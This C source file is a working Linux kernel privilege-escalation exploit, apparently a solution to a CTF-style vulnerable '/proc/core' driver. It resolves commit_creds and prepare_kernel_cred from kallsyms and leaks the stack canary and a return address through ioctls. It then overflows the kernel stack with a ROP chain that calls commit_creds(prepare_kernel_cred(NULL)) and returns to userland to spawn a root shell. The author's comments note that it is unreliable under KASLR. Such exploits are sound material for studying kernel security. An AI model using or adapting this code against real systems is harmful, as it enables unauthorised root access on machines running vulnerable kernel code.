/*
* It's strange the program works well when no kaslr.
* and fails when kaslr on. And sometimes it works, sometimes
* it doesn't work~
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <sys/mman.h>
#include <assert.h>

#define CORE_READ 0x6677889B
#define CORE_OFF 0x6677889C
#define CORE_COPY 0x6677889A

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() 
{
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory" );
}

void get_shell(void)
{
	if(!getuid())
		system("/bin/sh");

	exit(0);
}


void* (*prepare_kernel_cred)(void*);
void (*commit_creds)(void*);

void root(void)
{
	commit_creds(prepare_kernel_cred(NULL));
}

unsigned long get_kernel_sym(char *name)
{
        FILE *f;
        unsigned long addr;
        char dummy;
        char sname[512];
        struct utsname ver;
        int ret;
        int rep = 0;
        int oldstyle = 0;

        f = fopen("/tmp/kallsyms", "r");
        if (f == NULL) {
                f = fopen("/proc/ksyms", "r");
                if (f == NULL)
                        goto fallback;
                oldstyle = 1;
        }

repeat:
        ret = 0;
        while(ret != EOF) {
                if (!oldstyle)
                        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
                else {
                        ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
                        if (ret == 2) {
                                char *p;
                                if (strstr(sname, "_O/") || strstr(sname, "_S."))
                                        continue;
                                p = strrchr(sname, '_');
                                if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
                                        p = p - 4;
                                        while (p > (char *)sname && *(p - 1) == '_')
                                                p--;
                                        *p = '\0';
                                }
                        }
                }
                if (ret == 0) {
                        fscanf(f, "%s\n", sname);
                        continue;
                }
                if (!strcmp(name, sname)) {
                        fprintf(stdout, " [+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : 
"");
                        fclose(f);
                        return addr;
                }
        }

        fclose(f);
        if (rep)
                return 0;
fallback:
        uname(&ver);
        if (strncmp(ver.release, "2.6", 3))
                oldstyle = 1;
        sprintf(sname, "/boot/System.map-%s", ver.release);
        f = fopen(sname, "r");
        if (f == NULL)
                return 0;
        rep = 1;
        goto repeat;
}

int main()
{
	commit_creds = (void *) get_kernel_sym("commit_creds");
    prepare_kernel_cred = (void *) get_kernel_sym("prepare_kernel_cred");
	printf("[+] prepare_kernel_cred: %p\n", prepare_kernel_cred);
	printf("[+] commit_creds: %p\n", commit_creds);
	int i;
	int fd = open("/proc/core", O_RDWR);
	char *buf = (char *)malloc(0x200);
	//printf("[+] buf: %p\n", buf);
	unsigned long offset = 64;
	ioctl(fd, CORE_OFF, offset);
	ioctl(fd, CORE_READ, buf);
	//leak canary
	unsigned long canary, ret_addr;
	canary = ((unsigned long *)buf)[0];
	ret_addr = ((unsigned long *)buf)[2];
	printf("[+] canary: %p\n", canary);
	printf("[+] ret_addr: %p\n", ret_addr);

	
	//rop, no smep && smap
	void *temp_stack;
	assert((temp_stack = mmap((void*)0x30000000, 0x10000000, 7, 0x32, 0, 0)) == (void*)0x30000000);
	printf("It's strange save_state() must be executed before you declare the array of rop_chain[].\n");
	save_state();
	unsigned long rop_chain[] = {
	0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
    0x9090909090909090,
	canary,
	0x9090909090909090,
	(unsigned long)&root,
	ret_addr - 0xc5, 
	0xdeadbeef,
	(unsigned long)(ret_addr - 311838), 
	(unsigned long)get_shell,
	user_cs,
	user_rflags,
	(unsigned long)(temp_stack + 0x5000000),
	user_ss
	};
	long long count = 0xff00000000000100;
	
	write(fd, rop_chain, 0x200);
	ioctl(fd, CORE_COPY, count);
	


	return 0;
}